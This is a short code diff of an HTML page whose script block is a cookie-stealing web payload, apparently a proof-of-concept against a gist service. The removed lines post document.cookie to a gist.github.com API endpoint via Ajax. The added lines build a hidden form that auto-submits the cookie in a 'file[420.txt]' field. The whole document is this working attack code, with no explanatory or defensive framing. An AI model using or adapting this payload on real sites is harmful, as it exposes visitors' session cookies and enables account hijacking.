@@ -6,17 +6,17 @@
             'files[file2.ab]' => 'contents' })
 -->
 <script type="text/javascript" charset="utf-8">
-alert(document.cookie);
-new Ajax.Request('http://gist.github.com/api/v1/xml/new', {
-  method: 'post',
-  postBody: document.cookie,
-  onSuccess: function(transport) {
-    var notice = $('lolz');
-      notice.update(transport.responseText)
-  }
-});
-alert('butts');
-$('lolz').update('going');
+var f = document.createElement('form');
+f.style.display = 'none';
+$('lolz').parentNode.appendChild(f);
+f.method = 'POST'
+f.action = this.href;
+var m = document.createElement('input');
+m.setAttribute('type', 'hidden');
+m.setAttribute('name', 'file[420.txt]');
+m.setAttribute('value', document.cookie);
+f.appendChild(m);
+f.submit();
 </script>
 <pre id="lolz">
 </pre>
